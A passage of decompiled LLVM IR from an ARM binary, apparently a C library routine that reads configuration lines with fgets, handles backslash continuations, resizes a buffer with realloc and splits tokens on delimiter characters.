  br label %bb64

bb64:                                             ; preds = %dec_label_pc_168e0, %bb
  %v0_168f4 = phi i32 [ %v0_168f4.pre, %bb ], [ %v3_168e8, %dec_label_pc_168e0 ]
  %v2_168f4 = icmp eq i32 %v0_168f4, 0
  store i1 %v2_168f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168f4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_168a0, i32* %r3.global-to-local, align 4
  %v2_168fc = load i32, i32* @r5, align 4
  %v3_168fc = add i32 %v2_168fc, 8
  %v4_168fc = inttoptr i32 %v3_168fc to i32*
  store i32 %v1_168a0, i32* %v4_168fc, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_16900 = load i32, i32* @r5, align 4
  %v1_16900 = add i32 %v0_16900, 16
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  store i32 %v3_16900, i32* %r0.global-to-local, align 4
  %v1_16904 = add i32 %v0_16900, 8
  %v2_16904 = inttoptr i32 %v1_16904 to i32*
  %v3_16904 = load i32, i32* %v2_16904, align 4
  store i32 %v3_16904, i32* %r3.global-to-local, align 4
  %v2_16908 = add i32 %v3_16904, %v3_16900
  store i32 %v2_16908, i32* @r0, align 4
  %v0_1690c = call i32 @malloc()
  store i32 %v0_1690c, i32* %r0.global-to-local, align 4
  %v2_16910 = icmp eq i32 %v0_1690c, 0
  store i1 %v2_16910, i1* %cpsr_z.global-to-local, align 1
  %v1_16914 = load i32, i32* @r5, align 4
  %v2_16914 = add i32 %v1_16914, 4
  %v3_16914 = inttoptr i32 %v2_16914 to i32*
  store i32 %v0_1690c, i32* %v3_16914, align 4
  br i1 %v2_16910, label %dec_label_pc_16b84, label %dec_label_pc_1691c

dec_label_pc_1691c:                               ; preds = %.thread
  %v0_1691c = load i32, i32* @r5, align 4
  %v1_1691c = add i32 %v0_1691c, 20
  %v2_1691c = inttoptr i32 %v1_1691c to i32*
  %v3_1691c = load i32, i32* %v2_1691c, align 4
  %v1_16920 = or i32 %v3_1691c, 1
  store i32 %v1_16920, i32* %r3.global-to-local, align 4
  store i32 %v1_16920, i32* %v2_1691c, align 4
  %v0_16928.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16928

dec_label_pc_16928:                               ; preds = %dec_label_pc_168d4, %dec_label_pc_1691c
  %v1_16930 = phi i32 [ %v2_168f0, %dec_label_pc_168d4 ], [ %v0_16928.pre, %dec_label_pc_1691c ]
  %v1_16928 = add i32 %v1_16930, 4
  %v2_16928 = inttoptr i32 %v1_16928 to i32*
  %v3_16928 = load i32, i32* %v2_16928, align 4
  store i32 %v3_16928, i32* %r2.global-to-local, align 4
  %v4_16928 = add i32 %v1_16930, 8
  %v5_16928 = inttoptr i32 %v4_16928 to i32*
  %v6_16928 = load i32, i32* %v5_16928, align 4
  %v2_1692c = add i32 %v6_16928, %v3_16928
  store i32 %v2_1692c, i32* %r3.global-to-local, align 4
  %v2_16930 = add i32 %v1_16930, 12
  %v3_16930 = inttoptr i32 %v2_16930 to i32*
  store i32 %v2_1692c, i32* %v3_16930, align 4
  %v0_16934 = load i32, i32* @fp, align 4
  store i32 %v0_16934, i32* @r6, align 4
  br label %dec_label_pc_16938

dec_label_pc_16938:                               ; preds = %dec_label_pc_169c4, %dec_label_pc_169b0, %dec_label_pc_16928
  %v0_16940 = phi i32 [ %v0_16934, %dec_label_pc_16928 ], [ %v1_169b0, %dec_label_pc_169b0 ], [ %v0_16940.pre.pre, %dec_label_pc_169c4 ]
  %v0_16938 = load i32, i32* @r5, align 4
  %v1_16938 = add i32 %v0_16938, 12
  store i32 %v1_16938, i32* %r0.global-to-local, align 4
  %v1_1693c = inttoptr i32 %v1_16938 to i32*
  %v2_1693c = load i32, i32* %v1_1693c, align 4
  store i32 %v2_1693c, i32* %r0.global-to-local, align 4
  %v3_1693c = add i32 %v0_16938, 16
  %v4_1693c = inttoptr i32 %v3_1693c to i32*
  %v5_1693c = load i32, i32* %v4_1693c, align 4
  %v2_16940 = add i32 %v2_1693c, %v0_16940
  store i32 %v2_16940, i32* %r0.global-to-local, align 4
  %v2_16944 = sub i32 %v5_1693c, %v0_16940
  %v1_16948 = inttoptr i32 %v0_16938 to i32*
  %v2_16948 = load i32, i32* %v1_16948, align 4
  store i32 %v2_16948, i32* %r2.global-to-local, align 4
  %v3_1694c = call i32 @fgets(i32 %v2_16940, i32 %v2_16944, i32 %v2_16948)
  store i32 %v3_1694c, i32* %r0.global-to-local, align 4
  store i32 %v3_1694c, i32* %r4.global-to-local, align 4
  %v2_16950 = icmp eq i32 %v3_1694c, 0
  store i1 %v2_16950, i1* %cpsr_z.global-to-local, align 1
  %v0_16958 = load i32, i32* @r5, align 4
  %v1_16958 = add i32 %v0_16958, 12
  br i1 %v2_16950, label %dec_label_pc_16958, label %dec_label_pc_16970

dec_label_pc_16958:                               ; preds = %dec_label_pc_16938
  store i32 %v1_16958, i32* %r0.global-to-local, align 4
  %v1_1695c = inttoptr i32 %v1_16958 to i32*
  %v2_1695c = load i32, i32* %v1_1695c, align 4
  store i32 %v2_1695c, i32* %r0.global-to-local, align 4
  %v3_1695c = add i32 %v0_16958, 16
  %v4_1695c = inttoptr i32 %v3_1695c to i32*
  %v5_1695c = load i32, i32* %v4_1695c, align 4
  store i32 %v5_1695c, i32* %r2.global-to-local, align 4
  %v3_16964 = inttoptr i32 %v2_1695c to i8*
  %v4_16964 = call i32 @__GI_memset(i8* %v3_16964, i32 0, i32 %v5_1695c)
  store i32 %v4_16964, i32* %r0.global-to-local, align 4
  %v0_16968 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16b88

dec_label_pc_16970:                               ; preds = %dec_label_pc_16938
  %v2_16970 = inttoptr i32 %v1_16958 to i32*
  %v3_16970 = load i32, i32* %v2_16970, align 4
  store i32 %v3_16970, i32* @r4, align 4
  %v1_16974 = load i32, i32* @r6, align 4
  %v2_16974 = add i32 %v1_16974, %v3_16970
  %v3_16974 = inttoptr i32 %v2_16974 to i8*
  store i32 %v2_16974, i32* %r0.global-to-local, align 4
  %v3_16978 = call i32 @strlen(i8* %v3_16974)
  %v0_16980 = load i32, i32* @r6, align 4
  %v2_16980 = add i32 %v0_16980, %v3_16978
  store i32 %v2_16980, i32* @r6, align 4
  %v0_16984 = load i32, i32* @r4, align 4
  store i32 %v0_16984, i32* @r0, align 4
  %v2_16988 = call i32 @__GI_strchr(i32 %v0_16984, i32 10)
  store i32 %v2_16988, i32* %r0.global-to-local, align 4
  %v2_1698c = icmp eq i32 %v2_16988, 0
  store i1 %v2_1698c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1698c, label %dec_label_pc_169b8, label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %dec_label_pc_16970
  %v1_16994 = inttoptr i32 %v2_16988 to i8*
  %v2_16994 = load i8, i8* %v1_16994, align 1
  %v3_16994 = zext i8 %v2_16994 to i32
  %v1_16998 = add nuw nsw i32 %v3_16994, 255
  %v1_1699c = urem i32 %v1_16998, 256
  store i32 %v1_1699c, i32* %r3.global-to-local, align 4
  %v7_169a0 = icmp eq i32 %v1_1699c, 92
  store i1 %v7_169a0, i1* %cpsr_z.global-to-local, align 1
  %v1_169a4 = trunc i32 %v1_16998 to i8
  store i8 %v1_169a4, i8* %v1_16994, align 1
  %v0_169a8 = load i32, i32* @r6, align 4
  %v1_169a8 = add i32 %v0_169a8, -1
  store i32 %v1_169a8, i32* @r6, align 4
  %v0_169ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169ac, label %dec_label_pc_169b0, label %dec_label_pc_16a3c

dec_label_pc_169b0:                               ; preds = %dec_label_pc_16994
  %v1_169b0 = add i32 %v0_169a8, -2
  store i32 %v1_169b0, i32* @r6, align 4
  br label %dec_label_pc_16938

dec_label_pc_169b8:                               ; preds = %dec_label_pc_16970
  %v0_169b8 = load i32, i32* @r5, align 4
  %v1_169b8 = add i32 %v0_169b8, 20
  %v2_169b8 = inttoptr i32 %v1_169b8 to i32*
  %v3_169b8 = load i32, i32* %v2_169b8, align 4
  store i32 %v3_169b8, i32* %r3.global-to-local, align 4
  %v2_169bc = icmp eq i32 %v3_169b8, 0
  store i1 %v2_169bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169bc, label %dec_label_pc_169f4, label %dec_label_pc_169c4

dec_label_pc_169c4:                               ; preds = %dec_label_pc_169b8
  %v1_169c4 = add i32 %v0_169b8, 16
  %v2_169c4 = inttoptr i32 %v1_169c4 to i32*
  %v3_169c4 = load i32, i32* %v2_169c4, align 4
  store i32 %v3_169c4, i32* %r3.global-to-local, align 4
  %v1_169c8 = add i32 %v0_169b8, 8
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  %v1_169cc = add i32 %v3_169c4, 4096
  store i32 %v1_169cc, i32* %r3.global-to-local, align 4
  %v2_169d0 = add i32 %v3_169c8, %v1_169cc
  store i32 %v1_169cc, i32* %v2_169c4, align 4
  %v0_169d8 = load i32, i32* @r5, align 4
  %v1_169d8 = add i32 %v0_169d8, 4
  %v2_169d8 = inttoptr i32 %v1_169d8 to i32*
  %v3_169d8 = load i32, i32* %v2_169d8, align 4
  store i32 %v3_169d8, i32* %r0.global-to-local, align 4
  %v4_169dc = inttoptr i32 %v3_169d8 to i32*
  %v5_169dc = call i32 @realloc(i32* %v4_169dc, i32 %v2_169d0, i32 %v2_16948, i32 %v1_169cc)
  store i32 %v5_169dc, i32* %r0.global-to-local, align 4
  %v0_169e0 = load i32, i32* @r5, align 4
  %v1_169e0 = add i32 %v0_169e0, 8
  %v2_169e0 = inttoptr i32 %v1_169e0 to i32*
  %v3_169e0 = load i32, i32* %v2_169e0, align 4
  %v2_169e4 = add i32 %v3_169e0, %v5_169dc
  store i32 %v2_169e4, i32* %r3.global-to-local, align 4
  %v2_169e8 = add i32 %v0_169e0, 12
  %v3_169e8 = inttoptr i32 %v2_169e8 to i32*
  store i32 %v2_169e4, i32* %v3_169e8, align 4
  %v1_169ec = load i32, i32* @r5, align 4
  %v2_169ec = add i32 %v1_169ec, 4
  %v3_169ec = inttoptr i32 %v2_169ec to i32*
  store i32 %v5_169dc, i32* %v3_169ec, align 4
  %v0_16940.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16938

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169b8, %.dec_label_pc_169f4_crit_edge
  %v0_169f4 = phi i32 [ %v0_169f4.pre, %.dec_label_pc_169f4_crit_edge ], [ %v0_169b8, %dec_label_pc_169b8 ]
  %v1_169f4 = inttoptr i32 %v0_169f4 to i32*
  %v2_169f4 = load i32, i32* %v1_169f4, align 4
  store i32 %v2_169f4, i32* @r1, align 4
  %v1_169f8 = add i32 %v2_169f4, 52
  %v2_169f8 = inttoptr i32 %v1_169f8 to i32*
  %v3_169f8 = load i32, i32* %v2_169f8, align 4
  store i32 %v3_169f8, i32* %r3.global-to-local, align 4
  %v2_169fc = icmp eq i32 %v3_169f8, 0
  store i1 %v2_169fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169fc, label %dec_label_pc_16a28, label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169f4
  %v1_16a04 = add i32 %v2_169f4, 16
  %v2_16a04 = inttoptr i32 %v1_16a04 to i32*
  %v3_16a04 = load i32, i32* %v2_16a04, align 4
  store i32 %v3_16a04, i32* %r2.global-to-local, align 4
  %v1_16a08 = add i32 %v2_169f4, 24
  %v2_16a08 = inttoptr i32 %v1_16a08 to i32*
  %v3_16a08 = load i32, i32* %v2_16a08, align 4
  store i32 %v3_16a08, i32* %r3.global-to-local, align 4
  %v3_16a0c = icmp ult i32 %v3_16a04, %v3_16a08
  %v9_16a0c = icmp eq i32 %v3_16a04, %v3_16a08
  store i1 %v9_16a0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16a0c, label %dec_label_pc_16a30thread-pre-split, label %dec_label_pc_16a1c

dec_label_pc_16a1c:                               ; preds = %dec_label_pc_16a04
  store i32 %v2_169f4, i32* %r0.global-to-local, align 4
  %v1_16a20 = inttoptr i32 %v2_169f4 to i16*
  %v2_16a20 = call i32 @getc_unlocked(i16* %v1_16a20)
  store i32 %v2_16a20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a28:                               ; preds = %dec_label_pc_169f4
  store i32 %v2_169f4, i32* %r0.global-to-local, align 4
  %v1_16a2c = call i32 @__GI_fgetc(i32 %v2_169f4)
  store i32 %v1_16a2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a30thread-pre-split:               ; preds = %dec_label_pc_16a04
  %v2_16a10 = inttoptr i32 %v3_16a04 to i8*
  %v3_16a10 = load i8, i8* %v2_16a10, align 1
  %v4_16a10 = zext i8 %v3_16a10 to i32
  store i32 %v4_16a10, i32* %r0.global-to-local, align 4
  %v6_16a10 = add i32 %v3_16a04, 1
  store i32 %v6_16a10, i32* %r2.global-to-local, align 4
  store i32 %v6_16a10, i32* %v2_16a04, align 4
  %v0_16a30.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a30

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a30thread-pre-split, %dec_label_pc_16a1c, %dec_label_pc_16a28
  %v1_16a34 = phi i32 [ %v0_16a30.pr, %dec_label_pc_16a30thread-pre-split ], [ %v2_16a20, %dec_label_pc_16a1c ], [ %v1_16a2c, %dec_label_pc_16a28 ]
  %v7_16a30 = icmp eq i32 %v1_16a34, 10
  store i1 %v7_16a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16a30, label %dec_label_pc_16a3c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_16a30
  %v8_16a34 = icmp eq i32 %v1_16a34, -1
  store i1 %v8_16a34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16a34, label %dec_label_pc_16a3c.loopexit, label %.dec_label_pc_169f4_crit_edge

.dec_label_pc_169f4_crit_edge:                    ; preds = %bb66
  %v0_169f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_169f4

dec_label_pc_16a3c.loopexit:                      ; preds = %bb66, %dec_label_pc_16a30
  %v0_16a3c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16a3c

dec_label_pc_16a3c:                               ; preds = %dec_label_pc_16994, %dec_label_pc_16a3c.loopexit
  %v0_16a3c = phi i32 [ %v0_16a3c.pre, %dec_label_pc_16a3c.loopexit ], [ %v1_169a8, %dec_label_pc_16994 ]
  %v7_16a3c = icmp eq i32 %v0_16a3c, -1
  store i1 %v7_16a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16a3c, label %dec_label_pc_16b84, label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %dec_label_pc_16a3c
  store i32 %v1_168ac, i32* %r3.global-to-local, align 4
  store i1 %v2_16a48, i1* %cpsr_z.global-to-local, align 1
  %v0_16a4c = load i32, i32* @r5, align 4
  %v1_16a4c = add i32 %v0_16a4c, 12
  %v2_16a4c = inttoptr i32 %v1_16a4c to i32*
  %v3_16a4c = load i32, i32* %v2_16a4c, align 4
  store i32 %v3_16a4c, i32* @r4, align 4
  br i1 %v2_16a48, label %dec_label_pc_16a64, label %dec_label_pc_16a54

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a44
  store i32 %v3_16a4c, i32* @r0, align 4
  %v0_16a58 = load i32, i32* @sl, align 4
  %v2_16a5c = inttoptr i32 %v3_16a4c to i8*
  %v3_16a5c = call i32 @__GI_strspn(i8* %v2_16a5c, i32 %v0_16a58)
  store i32 %v3_16a5c, i32* %r0.global-to-local, align 4
  %v0_16a60 = load i32, i32* @r4, align 4
  %v2_16a60 = add i32 %v0_16a60, %v3_16a5c
  store i32 %v2_16a60, i32* @r4, align 4
  br label %dec_label_pc_16a64

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a44, %dec_label_pc_16a54
  %v0_16a64 = phi i32 [ %v3_16a4c, %dec_label_pc_16a44 ], [ %v2_16a60, %dec_label_pc_16a54 ]
  %v1_16a64 = inttoptr i32 %v0_16a64 to i8*
  %v2_16a64 = load i8, i8* %v1_16a64, align 1
  %v3_16a64 = zext i8 %v2_16a64 to i32
  store i32 %v3_16a64, i32* %r2.global-to-local, align 4
  %v2_16a68 = icmp eq i8 %v2_16a64, 0
  store i1 %v2_16a68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16a68, label %dec_label_pc_168d4.backedge, label %dec_label_pc_16a70

dec_label_pc_168d4.backedge:                      ; preds = %dec_label_pc_16a64, %dec_label_pc_16a70, %dec_label_pc_16b7c
  %v0_168d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_168d4

dec_label_pc_16a70:                               ; preds = %dec_label_pc_16a64
  %v0_16a70 = load i32, i32* @r7, align 4
  %v1_16a70 = inttoptr i32 %v0_16a70 to i8*
  %v2_16a70 = load i8, i8* %v1_16a70, align 1
  %v3_16a70 = zext i8 %v2_16a70 to i32
  store i32 %v3_16a70, i32* %r3.global-to-local, align 4
  %v9_16a74 = icmp eq i8 %v2_16a70, %v2_16a64
  store i1 %v9_16a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16a74, label %dec_label_pc_168d4.backedge, label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a70
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_16a80 = load i32, i32* @r5, align 4
  %v1_16a80 = add i32 %v0_16a80, 4
  %v2_16a80 = inttoptr i32 %v1_16a80 to i32*
  %v3_16a80 = load i32, i32* %v2_16a80, align 4
  store i32 %v3_16a80, i32* %r0.global-to-local, align 4
  %v0_16a84 = load i32, i32* @fp, align 4
  store i32 %v3_16a80, i32* %v1_16aa0, align 4
  store i32 %v3_16898, i32* %r2.global-to-local, align 4
  %v3_16a90 = inttoptr i32 %v3_16a80 to i8*
  %v4_16a90 = call i32 @__GI_memset(i8* %v3_16a90, i32 %v0_16a84, i32 %v3_16898)
  store i32 %v4_16a90, i32* %r0.global-to-local, align 4
  %v0_16a94 = load i32, i32* @fp, align 4
  store i32 %v0_16a94, i32* @r6, align 4
  %v0_16b5412 = load i32, i32* @r4, align 4
  %v1_16b5413 = inttoptr i32 %v0_16b5412 to i8*
  %v2_16b5414 = load i8, i8* %v1_16b5413, align 1
  %v3_16b5415 = zext i8 %v2_16b5414 to i32
  store i32 %v3_16b5415, i32* %r2.global-to-local, align 4
  %v2_16b5816 = icmp eq i8 %v2_16b5414, 0
  store i1 %v2_16b5816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b5816, label %dec_label_pc_16b70, label %dec_label_pc_16b60

dec_label_pc_16a9c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_16aa0 = load i32, i32* %v1_16aa0, align 4
  store i32 %v2_16aa0, i32* %r3.global-to-local, align 4
  store i32 %v1_168b0, i32* %r2.global-to-local, align 4
  %v9_16aa8 = icmp eq i32 %v2_16aac, %v1_168b0
  store i1 %v9_16aa8, i1* %cpsr_z.global-to-local, align 1
  %v5_16aac = mul i32 %v2_16aac, 4
  %v6_16aac = add i32 %v2_16aa0, %v5_16aac
  %v7_16aac = inttoptr i32 %v6_16aac to i32*
  store i32 %v0_16aac, i32* %v7_16aac, align 4
  br i1 %v9_16aa8, label %dec_label_pc_16ab4, label %dec_label_pc_16ac0

dec_label_pc_16ab4:                               ; preds = %dec_label_pc_16a9c
  store i32 %v1_168bc, i32* %r3.global-to-local, align 4
  store i1 %v2_16ab8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ab8, label %dec_label_pc_16ac0, label %dec_label_pc_16ae0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16ab4, %dec_label_pc_16a9c
  %v0_16ac0 = load i32, i32* @r7, align 4
  %v1_16ac0 = inttoptr i32 %v0_16ac0 to i8*
  %v2_16ac0 = load i8, i8* %v1_16ac0, align 1
  %v3_16ac0 = zext i8 %v2_16ac0 to i32
  store i32 %v3_16ac0, i32* %r3.global-to-local, align 4
  %v2_16ac4 = icmp eq i8 %v2_16ac0, 0
  store i1 %v2_16ac4, i1* %cpsr_z.global-to-local, align 1
  %v0_16ac8 = load i32, i32* @r4, align 4
  store i32 %v0_16ac8, i32* @r0, align 4
  %v1_16acc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_16ac4, i32 %v1_16acc, i32 %v0_16ac0
  store i32 %storemerge, i32* @r1, align 4
  %v0_16ad4 = call i32 @strcspn()
  store i32 %v0_16ad4, i32* %r0.global-to-local, align 4
  %v0_16ad8 = load i32, i32* @r4, align 4
  %v2_16ad8 = add i32 %v0_16ad8, %v0_16ad4
  store i32 %v2_16ad8, i32* @r4, align 4
  br label %dec_label_pc_16b18

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ab4
  %v0_16ae0 = load i32, i32* @r4, align 4
  store i32 %v0_16ae0, i32* @r0, align 4
  %v0_16ae4 = load i32, i32* @r7, align 4
  %v1_16ae4 = inttoptr i32 %v0_16ae4 to i8*
  %v2_16ae4 = load i8, i8* %v1_16ae4, align 1
  %v3_16ae4 = zext i8 %v2_16ae4 to i32
  %v5_16ae8 = call i32 @__GI_strchrnul(i32 %v0_16ae0, i32 %v3_16ae4, i32 %v1_168b0, i32 %v1_168bc)
  store i32 %v5_16ae8, i32* %r0.global-to-local, align 4
  store i32 %v1_168ac, i32* %r2.global-to-local, align 4
  store i1 %v2_16a48, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_16ae8, i32* @r4, align 4
  br i1 %v2_16a48, label %dec_label_pc_16b18, label %dec_label_pc_16b04

dec_label_pc_16b00:                               ; preds = %dec_label_pc_16b04
  %v1_16b00 = add i32 %v0_16b18.pre, -1
  store i32 %v1_16b00, i32* @r4, align 4
  br label %dec_label_pc_16b04

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16ae0, %dec_label_pc_16b00
  %v0_16b04 = phi i32 [ %v1_16b00, %dec_label_pc_16b00 ], [ %v5_16ae8, %dec_label_pc_16ae0 ]
  %v1_16b04 = add i32 %v0_16b04, -1
  %v2_16b04 = inttoptr i32 %v1_16b04 to i8*
  %v3_16b04 = load i8, i8* %v2_16b04, align 1
  %v4_16b04 = zext i8 %v3_16b04 to i32
  %v0_16b08 = load i32, i32* @sl, align 4
  store i32 %v0_16b08, i32* @r0, align 4
  %v2_16b0c = call i32 @__GI_strchr(i32 %v0_16b08, i32 %v4_16b04)
  store i32 %v2_16b0c, i32* %r0.global-to-local, align 4
  %v2_16b10 = icmp eq i32 %v2_16b0c, 0
  store i1 %v2_16b10, i1* %cpsr_z.global-to-local, align 1
  %v0_16b18.pre = load i32, i32* @r4, align 4
  br i1 %v2_16b10, label %dec_label_pc_16b18, label %dec_label_pc_16b00

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16b04, %dec_label_pc_16ae0, %dec_label_pc_16ac0
  %v3_16b24 = phi i32 [ %v5_16ae8, %dec_label_pc_16ae0 ], [ %v2_16ad8, %dec_label_pc_16ac0 ], [ %v0_16b18.pre, %dec_label_pc_16b04 ]
  %v1_16b18 = inttoptr i32 %v3_16b24 to i8*
  %v2_16b18 = load i8, i8* %v1_16b18, align 1
  %v3_16b18 = zext i8 %v2_16b18 to i32
  store i32 %v3_16b18, i32* %r2.global-to-local, align 4
  %v0_16b1c = load i32, i32* @r7, align 4
  %v1_16b1c = inttoptr i32 %v0_16b1c to i8*
  %v2_16b1c = load i8, i8* %v1_16b1c, align 1
  %v3_16b1c = zext i8 %v2_16b1c to i32
  store i32 %v3_16b1c, i32* %r3.global-to-local, align 4
  %v9_16b20 = icmp eq i8 %v2_16b1c, %v2_16b18
  store i1 %v9_16b20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b20, label %bb69, label %dec_label_pc_16b2c

bb69:                                             ; preds = %dec_label_pc_16b18
  %v1_16b24 = load i32, i32* @fp, align 4
  %v2_16b24 = trunc i32 %v1_16b24 to i8
  store i8 %v2_16b24, i8* %v1_16b18, align 1
  %v0_16b28.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16b28.pr, label %bb71, label %.dec_label_pc_16b2c_crit_edge

.dec_label_pc_16b2c_crit_edge:                    ; preds = %bb69
  %v0_16b2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %.dec_label_pc_16b2c_crit_edge, %dec_label_pc_16b18
  %v0_16b2c = phi i32 [ %v0_16b2c.pre, %.dec_label_pc_16b2c_crit_edge ], [ %v3_16b18, %dec_label_pc_16b18 ]
  %v2_16b2c = icmp eq i32 %v0_16b2c, 0
  store i1 %v2_16b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b2c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_16b2c
  %v1_16b30 = load i32, i32* @fp, align 4
  %v2_16b30 = trunc i32 %v1_16b30 to i8
  %v3_16b30 = load i32, i32* @r4, align 4
  %v4_16b30 = inttoptr i32 %v3_16b30 to i8*
  store i8 %v2_16b30, i8* %v4_16b30, align 1
  %v5_16b30 = load i32, i32* @r4, align 4
  %v6_16b30 = add i32 %v5_16b30, 1
  store i32 %v6_16b30, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_16b2c, %bb70
  %v2_16b34 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_16b34, i32* %r3.global-to-local, align 4
  %v2_16b38 = icmp eq i32 %v2_16b34, 0
  store i1 %v2_16b38, i1* %cpsr_z.global-to-local, align 1
  %v0_16b54.pre = load i32, i32* @r4, align 4
  br i1 %v2_16b38, label %dec_label_pc_16b50, label %dec_label_pc_16b40

dec_label_pc_16b40:                               ; preds = %bb71
  store i32 %v0_16b54.pre, i32* @r0, align 4
  %v0_16b44 = load i32, i32* @sl, align 4
  %v2_16b48 = inttoptr i32 %v0_16b54.pre to i8*
  %v3_16b48 = call i32 @__GI_strspn(i8* %v2_16b48, i32 %v0_16b44)
  store i32 %v3_16b48, i32* %r0.global-to-local, align 4
  %v0_16b4c = load i32, i32* @r4, align 4
  %v2_16b4c = add i32 %v0_16b4c, %v3_16b48
  store i32 %v2_16b4c, i32* @r4, align 4
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %bb71, %dec_label_pc_16b40
  %v0_16b54 = phi i32 [ %v2_16b4c, %dec_label_pc_16b40 ], [ %v0_16b54.pre, %bb71 ]
  %v0_16b50 = load i32, i32* @r6, align 4
  %v1_16b50 = add i32 %v0_16b50, 1
  store i32 %v1_16b50, i32* @r6, align 4
  %v1_16b54 = inttoptr i32 %v0_16b54 to i8*
  %v2_16b54 = load i8, i8* %v1_16b54, align 1
  %v3_16b54 = zext i8 %v2_16b54 to i32
  store i32 %v3_16b54, i32* %r2.global-to-local, align 4
  %v2_16b58 = icmp eq i8 %v2_16b54, 0
  store i1 %v2_16b58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b58, label %dec_label_pc_16b70, label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16a7c, %dec_label_pc_16b50
  %v0_16aac = phi i32 [ %v0_16b54, %dec_label_pc_16b50 ], [ %v0_16b5412, %dec_label_pc_16a7c ]
  %v2_16aac = phi i32 [ %v1_16b50, %dec_label_pc_16b50 ], [ %v0_16a94, %dec_label_pc_16a7c ]
  %v1_16b64 = phi i32 [ %v3_16b54, %dec_label_pc_16b50 ], [ %v3_16b5415, %dec_label_pc_16a7c ]
  %v0_16b60 = load i32, i32* @r7, align 4
  %v1_16b60 = inttoptr i32 %v0_16b60 to i8*
  %v2_16b60 = load i8, i8* %v1_16b60, align 1
  %v3_16b60 = zext i8 %v2_16b60 to i32
  store i32 %v3_16b60, i32* %r3.global-to-local, align 4
  %v9_16b64 = icmp eq i32 %v3_16b60, %v1_16b64
  store i1 %v9_16b64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_16b64, label %dec_label_pc_16b70, label %bb72

bb72:                                             ; preds = %dec_label_pc_16b60
  %v2_16b68 = load i32, i32* @sb, align 4
  %v3_16b68 = sub i32 %v2_16aac, %v2_16b68
  %v5_16b68 = xor i32 %v2_16b68, %v2_16aac
  %v6_16b68 = xor i32 %v3_16b68, %v2_16aac
  %v7_16b68 = and i32 %v6_16b68, %v5_16b68
  %v8_16b68 = icmp slt i32 %v7_16b68, 0
  %v9_16b68 = icmp slt i32 %v3_16b68, 0
  %v10_16b68 = icmp eq i32 %v2_16aac, %v2_16b68
  store i1 %v10_16b68, i1* %cpsr_z.global-to-local, align 1
  %v2_16b6c = xor i1 %v9_16b68, %v8_16b68
  br i1 %v2_16b6c, label %dec_label_pc_16a9c, label %dec_label_pc_16b70

dec_label_pc_16b70:                               ; preds = %dec_label_pc_16b60, %dec_label_pc_16b50, %bb72, %dec_label_pc_16a7c
  %v0_16b74 = phi i32 [ %v0_16a94, %dec_label_pc_16a7c ], [ %v2_16aac, %dec_label_pc_16b60 ], [ %v1_16b50, %dec_label_pc_16b50 ], [ %v2_16aac, %bb72 ]
  store i32 %v3_16894, i32* %r2.global-to-local, align 4
  %v9_16b74 = icmp eq i32 %v0_16b74, %v3_16894
  store i1 %v9_16b74, i1* %cpsr_z.global-to-local, align 1
  %v6_16b78 = icmp slt i32 %v0_16b74, %v3_16894
  br i1 %v6_16b78, label %dec_label_pc_16b7c, label %dec_label_pc_16b88

